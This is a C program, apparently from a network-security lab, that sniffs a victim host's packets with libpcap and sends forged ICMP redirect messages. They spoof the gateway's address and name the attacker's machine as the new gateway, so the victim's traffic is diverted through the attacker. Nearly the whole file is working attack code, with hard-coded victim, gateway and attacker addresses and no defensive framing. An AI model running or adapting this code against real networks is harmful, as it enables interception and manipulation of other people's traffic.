#include <pcap.h>
#include <time.h>
#include <stdlib.h>
#include <stdio.h>
#include <netinet/in.h>  
#include <sys/socket.h>
#include <unistd.h>
#include <string.h>
#include <arpa/inet.h>

#define MAX 1024
#define SIZE_ETHERNET 14
#define IP_HEAD_LEN 20
#define ICMP_HEAD_LEN 8

const unsigned char *victim_ip = "192.168.139.134";
const unsigned char *gw_ip = "192.168.139.2";
const unsigned char *attacker_ip = "192.168.139.131";
int flag = 0;

/* IP header */
struct ip_header  
{  
#ifdef WORDS_BIGENDIAN  
	u_int8_t ip_version:4;  
	u_int8_t ip_header_length:4;  
#else  
	u_int8_t ip_header_length:4;  
	u_int8_t ip_version:4;  
#endif  
	u_int8_t ip_tos;  
	u_int16_t ip_length;  
	u_int16_t ip_id;  
	u_int16_t ip_off;  
	u_int8_t ip_ttl;  
	u_int8_t ip_protocol;  
	u_int16_t ip_checksum;  
	struct in_addr ip_source_address;  
	struct in_addr ip_destination_address;  
};  

struct icmp_header  
{  
	u_int8_t icmp_type;  
	u_int8_t icmp_code;  
	u_int16_t icmp_checksum;  
	struct in_addr icmp_gateway_addr;

	//u_int16_t icmp_identifier;  
	//u_int16_t icmp_sequence;  
};  

u_int16_t checksum(u_int8_t *buf,int len)  
{  
	u_int32_t sum=0;  
	u_int16_t *cbuf; 
 
	cbuf=(u_int16_t *)buf;  
	  
	while(len>1) {  
		sum+=*cbuf++;  
		len-=2;  
	}  
	  
    	if(len)  
        	sum+=*(u_int8_t *)cbuf;  
  
    	sum=(sum>>16)+(sum & 0xffff);  
    	sum+=(sum>>16);  
  
        return ~sum;  
}  

void ping_redirect(int sockfd,const unsigned char *data,int datalen)
{ 
	char buf[MAX],*p;
	struct ip_header *ip;
	struct icmp_header *icmp;
	int len,i;
	struct sockaddr_in dest; 

	memset(buf, 0, MAX);

	/*dest ip, ip of victim*/
	dest.sin_family = AF_INET;
	dest.sin_addr.s_addr = inet_addr(victim_ip);

	ip = (struct ip_header*)buf;
	ip->ip_version = 4;
	ip->ip_header_length = sizeof(struct ip_header) >> 2;
	ip->ip_tos = 0;
	ip->ip_length = sizeof(struct ip_header) + sizeof(struct icmp_header) + datalen;
	ip->ip_id = 0;
	ip->ip_off = 0;
	ip->ip_ttl = 255;
	ip->ip_protocol = IPPROTO_ICMP;
	ip->ip_source_address.s_addr = inet_addr(gw_ip);//要伪造网关发送ip报文
	ip->ip_destination_address.s_addr = inet_addr(victim_ip);//dest address is victim's ip
	

	icmp = (struct icmp_header*)(buf + IP_HEAD_LEN);
	icmp->icmp_type = 5;//ICMP_REDIRECT
	icmp->icmp_code = 1;//redirect
	icmp->icmp_checksum = 0;
	icmp->icmp_gateway_addr.s_addr = inet_addr(attacker_ip);//change victim's gateway address to attacker_ip

	p = buf + IP_HEAD_LEN + ICMP_HEAD_LEN;
	for (i = 0; i < datalen; ++i) {
		p[i] = data[i];//iphead+8byte data
	}

	icmp->icmp_checksum = checksum((u_int8_t *)icmp, ICMP_HEAD_LEN+IP_HEAD_LEN+8);//check from type to end 8 + 20 + 8

	sendto(sockfd, buf, IP_HEAD_LEN + ICMP_HEAD_LEN + IP_HEAD_LEN + 8,
			0, (struct sockaddr *)&dest, sizeof(dest));
}

int parse_ipheader(const u_char *ip_packet)
{
	const struct ip_header *ip;
	int ip_header_len;
	int sockfd, res, one = 1, count = 0;
    	int *ptr_one = &one;
	
	ip = (struct ip_header*)ip_packet;
	ip_header_len = ip->ip_header_length*4;

	if(ip_header_len < IP_HEAD_LEN) {
		printf("Invalid IP header len!\n");
		return -1;
	}

	printf("Src :%s\n",inet_ntoa(ip->ip_source_address));

	if(!strcmp(victim_ip, inet_ntoa(ip->ip_source_address))) {
		//packet from victim
		printf("find!\n");
		flag = 1;
		count = 0;
		while (count++ < 5) {
			one = 1;
			if((sockfd = socket(AF_INET,SOCK_RAW,IPPROTO_ICMP))<0) {
				printf("create sockfd error\n");
				return -1;
			}
			res = setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL,ptr_one, sizeof(one));
    			if(res < 0) {
				printf("error--\n");
				return -1;
			}

			ping_redirect(sockfd, ip_packet, IP_HEAD_LEN + 8);//iphead+tcpport,as data of icmp data
		}
		
	}

}

void get_packet(u_char * arg, const struct pcap_pkthdr * pkthdr, const u_char * packet)
{
	static int id = 0;
	const struct sniff_ethernet *ethernet;

	printf("=============================\n");
	printf("id: %d\n", ++id);
	printf("Packet length: %d\n", pkthdr->len);
	printf("Number of bytes: %d\n", pkthdr->caplen);
	printf("Recieved time: %s", ctime((const time_t *)&pkthdr->ts.tv_sec)); 

	ethernet = (struct sniff_ethernet*)packet;
	parse_ipheader(packet + SIZE_ETHERNET);

}

int main()
{
	
	char errbuf[PCAP_ERRBUF_SIZE], *dev_name;
	pcap_t *device;
	struct bpf_program filter;
	char filterstr[50] = {0};

	/* get a device */
	dev_name = pcap_lookupdev(errbuf);
	if(dev_name) {
		printf("success: device: %s\n", dev_name);
	} else {
		printf("error: %s\n", errbuf);
		return -1;
	}

	/* open a device, wait until a packet arrives */
	device = pcap_open_live(dev_name, 65535, 1, 0, errbuf);

	sprintf(filterstr,"src host %s",victim_ip);
	pcap_compile(device, &filter, filterstr, 1, 0);
	pcap_setfilter(device,&filter);

	/* wait loop forever */
	pcap_loop(device, -1, get_packet, NULL);
    
	pcap_freecode(&filter);
	pcap_close(device);
    	return 0;
}
